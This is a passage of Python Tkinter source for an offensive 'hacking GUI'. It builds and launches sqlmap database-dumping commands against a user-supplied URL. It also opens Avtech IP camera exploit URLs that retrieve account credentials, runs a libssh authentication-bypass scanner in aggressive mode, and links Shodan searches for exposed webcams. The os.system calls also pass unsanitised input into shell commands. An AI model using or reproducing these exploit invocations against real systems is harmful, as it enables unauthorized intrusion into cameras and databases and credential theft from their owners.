		#Label
		self.sql_label = tk.Label (self.master, text ="Choose Commands : ", width = 28)
		self.sql_label.configure(background = "green", fg = "black")
		self.sql_label.pack()

		#Checkbuttons
		self.command_u = IntVar()
		self.Checkbutton_u = tk.Checkbutton (self.master, text ="-u", variable = self.command_u, width =25)
		self.Checkbutton_u.configure(background = "green" , fg = 'black')
		self.Checkbutton_u.pack()

		self.command_dbs = IntVar()
		self.Checkbutton_dbs = tk.Checkbutton (self.master, text ="--dbs", variable = self.command_dbs, width =25)
		self.Checkbutton_dbs.configure(background = "green" , fg = "black")
		self.Checkbutton_dbs.pack()
		#levels
		self.command_level1 = IntVar()
		self.Checkbutton_level1 = tk.Checkbutton (self.master, text = "--level=1", variable = self.command_level1, width = 25)
		self.Checkbutton_level1.configure(background = "light blue", fg = "black")
		self.Checkbutton_level1.pack()

		self.command_level2 = IntVar()
		self.Checkbutton_level2 = tk.Checkbutton (self.master, text = "--level=2",variable = self.command_level2, width = 25)
		self.Checkbutton_level2.configure(background = "light blue", fg = "black")
		self.Checkbutton_level2.pack()

		self.command_level3 = IntVar()
		self.Checkbutton_level3 = tk.Checkbutton (self.master, text = "--level=3",variable = self.command_level3, width = 25)
		self.Checkbutton_level3.configure(background = "light blue", fg = "black")		
		self.Checkbutton_level3.pack()

		self.command_level4 = IntVar()
		self.Checkbutton_level4 = tk.Checkbutton (self.master, text = "--level=4",variable = self.command_level4, width = 25)
		self.Checkbutton_level4.configure(background = "light blue", fg = "black")
		self.Checkbutton_level4.pack()

		self.command_level5 = IntVar()
		self.Checkbutton_level5 = tk.Checkbutton (self.master, text = "--level=5",variable = self.command_level5, width = 25)
		self.Checkbutton_level5.configure(background = "light blue", fg = "black")
		self.Checkbutton_level5.pack()

		#risks
		self.command_risk1 = IntVar()
		self.Checkbutton_risk1 = tk.Checkbutton (self.master, text = "Risk=1", variable = self.command_risk1, width= 25)
		self.Checkbutton_risk1.configure(background = "red", fg = "black")
		self.Checkbutton_risk1.pack()

		self.command_risk2 = IntVar()
		self.Checkbutton_risk2 = tk.Checkbutton (self.master, text = "Risk=2", variable = self.command_risk2, width= 25)
		self.Checkbutton_risk2.configure(background = "red", fg = "black")
		self.Checkbutton_risk2.pack()

		self.command_risk3 = IntVar()
		self.Checkbutton_risk3 = tk.Checkbutton (self.master, text = "Risk=3", variable = self.command_risk3, width= 25)
		self.Checkbutton_risk3.configure(background = "red", fg = "black")
		self.Checkbutton_risk3.pack()


		#attack
		self.start_sqlmap = tk.Button(self.frame, text = "Start", width = 25, command = self.start_sqlmap)
		self.start_sqlmap.configure(background = "dark red", fg = "gold")
		self.start_sqlmap.pack()

		self.button_exit_sqlmap = tk.Button(self.frame, text = "Close", width = 25 , command = self.exit_sqlmap)
		self.button_exit_sqlmap.configure(background = "black", fg = "gold")
		self.button_exit_sqlmap.pack()
	
		#Entries

		self.new_target_url = Entry (self.master,width = 28)
		self.new_target_url.pack(before = self.button_enter_target_url)
		self.new_target_url.configure(background = "dark red",fg = "gold")
		self.new_target_url.focus_set()
	
		self.frame.pack()

	def change_target_url(self):
		global new_target_url
		new_url = self.new_target_url.get()
		network_info.url = new_url

	def start_sqlmap(self):
		command = "python sqlmap.py " 
		commands_0 = ""
		commands_1 = ""
		commands_2 = ""
		commands_3 = ""
		commands_4 = ""
		commands_5 = ""
		commands_6 = ""
		commands_7 = ""
		commands_8 = ""
		commands_9 = ""


		if self.command_u.get() == 1 :
		    commands_0 = " -u "
		if self.command_dbs.get () == 1 :
		    commands_1 = " --dbs "  
		if self.command_level1.get() == 1:
		     commands_2 = " --level=1 "
		if self.command_level2.get() == 1:
		     commands_3 = " --level=2 "
		if self.command_level3.get() == 1:
		     commands_4 = " --level=3 "
		if self.command_level4.get() == 1:
		    commands_5 = " --level=4 "
		if self.command_level5.get() == 1:
		    commands_6 = " --level=5 "
		if self.command_risk1.get() == 1:
		    commands_7 = " --risk=1 "
		if self.command_risk2.get() == 1:
		    commands_8 = " --risk=2 "
		if self.command_risk3.get() == 1:
		    commands_9 = " --risk=3 "


		os.system("cd /root/sqlmap && gnome-terminal -x " + command + commands_0 +' "'+ network_info.url + '" '+commands_1+commands_2+commands_3+commands_4+commands_5+commands_6+commands_7+commands_8+commands_9)

	def exit_sqlmap(self):
		self.master.destroy()

class exploit_db_section:
	def __init__(self,master):
		#configuration
		self.master = master
		self.frame = tk.Frame(self.master)
		self.master.title("Exploit database section")
		
		#buttons
		
		#Change Target IP
		self.enter_target_ip = tk.Button(self.frame, text ="Enter target IP", width = 25, command = self.change_target_ip)
		self.enter_target_ip.configure(background = "dark red", fg = "gold")
		self.enter_target_ip.pack()
		
		#Change target Port
		self.enter_target_port = tk.Button(self.frame, text = "Enter target Port", width = 25, command = self.enter_target_port)
		self.enter_target_port.configure(background = "dark red", fg = "gold")
		self.enter_target_port.pack()
		
		#Avtech IP Camera exploit 1 Button
		self.button_exploit_avtech = tk.Button(self.frame, text = "Avtech IP Cam Exploit 1", width = 25, command = self.avtech_exploit)
		self.button_exploit_avtech.configure(background = "dark blue", fg = "green")
		self.button_exploit_avtech.pack()
		
		#Avtech IP Camera exploit 2 button
		self.button_exploit_avtech2 = tk.Button (self.frame, text ="Avtech IP Cam Exploit 2", width = 25, command = self.avtech_exploit2)
		self.button_exploit_avtech2.configure(background = "dark blue", fg = "green")
		self.button_exploit_avtech2.pack()
		
		#LibSSH Pass Authentication bypass
		self.button_LibSSH = tk.Button (self.frame, text = "LibSSH Pass Bypass", width = 25 , command = self.libssh_exploit)
		self.button_LibSSH.configure(background = "dark red", fg = "gold")
		self.button_LibSSH.pack()
		
		#Entries
		self.new_target_port = Entry (self.master, width = 28)
		self.new_target_port.configure(background = "dark red", fg = "gold")
		self.new_target_port.pack(before = self.enter_target_port)
		
		self.new_target_ip2 = Entry (self.master, width = 28)
		self.new_target_ip2.configure(background = "dark red", fg = "gold")
		self.new_target_ip2.pack(before = self.enter_target_ip)
		
		self.quit_button = tk.Button (self.frame,text ="Close", width = 25, command = self.close_database_section_window)
		self.quit_button.configure(background = "black", fg = "gold")
		self.quit_button.pack()
		
		self.frame.pack()

	def avtech_exploit(self):
		#first exploit for avtech ip camera
		webbrowser.open("http://"+network_info.target_ip+":"+network_info.port+"/")
		webbrowser.open("http://"+network_info.target_ip+":"+network_info.port+"/cgi-bin/user/Config.cgi?.cab&action=get&category=Account.*")

	def avtech_exploit2(self):
		#second exploit for avtech ip camera
		webbrowser.open("http://"+network_info.target_ip+":"+network_info.port+"/")
		webbrowser.open("http://"+network_info.target_ip+":"+network_info.port+"/cgi-bin/user/Config.cgi?/nobody&action=get&category=Account.*")

	def libssh_exploit(self):
		os.system('gnome-terminal && cd /root/libssh-scanner && python libsshscan.py --port '+network_info.port+' --aggressive '+network_info.target_ip)		

	def change_target_ip(self):
		global new_target_ip2
		target_ip2 = self.new_target_ip2.get()
		network_info.target_ip = target_ip2

	def enter_target_port(self):
		global enter_target_port
		target_port = self.new_target_port.get()
		network_info.port = target_port

	def close_database_section_window(self):
		#close the window
		self.master.destroy()

class shodan_section:
	def __init__(self,master):
		self.master = master
		self.frame = tk.Frame(self.master)
		self.master.title("Shodan Section")

		#buttons
		self.button_webcam_7 = tk.Button(self.frame, text ="Webcam 7", width = 25 , command = self.webcam_7)
		self.button_webcam_7.configure (background = "dark red", fg = "gold")
		self.button_webcam_7.pack()

		self.button_avtech_camera = tk.Button(self.frame, text = "Avtech Cameras" , width = 25 , command = self.avtech_camera)
		self.button_avtech_camera.configure(background = "dark red", fg = "gold")
		self.button_avtech_camera.pack()
		
		self.quit = tk.Button(self.frame, text = "Close", width = 25 , command = self.close_shodan_window)
		self.quit.configure ( background = "black", fg = "gold")
		self.quit.pack()

		self.frame.pack()

	def webcam_7(self):
		webbrowser.open("https://www.shodan.io/search?query=%22webcam+7%22")

	def avtech_camera(self):
		webbrowser.open("https://www.shodan.io/search?query=linux+upnp+avtech+")
	
	def close_shodan_window(self):
		self.master.destroy()

class whatweb_section:
	def __init__(self,master):
		self.master = master
		self.frame = tk.Frame(self.master)
		self.master.title ("WhatWeb Section")

		#Buttons
		self.button_enter_target_url = tk.Button(self.frame, text = "Enter target URL", width = 25, command = self.change_target_url)
		self.button_enter_target_url.configure(background = "dark red", fg = "gold")
		self.button_enter_target_url.pack()

		self.button_start_whatweb = tk.Button(self.frame, text = "Start whatweb" , width = 25 , command = self.whatweb_start)
		self.button_start_whatweb.configure(background = "dark red", fg = "gold")
		self.button_start_whatweb.pack()
		
		self.button_quit = tk.Button(self.frame, text = "Close", width = 25, command = self.close_whatweb_window)
		self.button_quit.configure (background = "black", fg = "gold")
		self.button_quit.pack()

		#Entry
		self.new_target_url = Entry (self.master,width = 28)
		self.new_target_url.configure (background = "dark red", fg = "gold")
		self.new_target_url.pack(before = self.button_enter_target_url)
		self.new_target_url.focus_set()

		self.frame.pack()

	def change_target_url(self):
		global new_target_url
		new_url = self.new_target_url.get()
		network_info.url = new_url
		print("URL Entered : "+ network_info.url)

	def whatweb_start(self):
		os.system("whatweb -v " + network_info.url)
		
	def close_whatweb_window(self):
		self.master.destroy()

def main():
	root = tk.Tk()
	app = digitilize_main_window(root)
	root.mainloop()
	
if __name__ == '__main__':
	main()
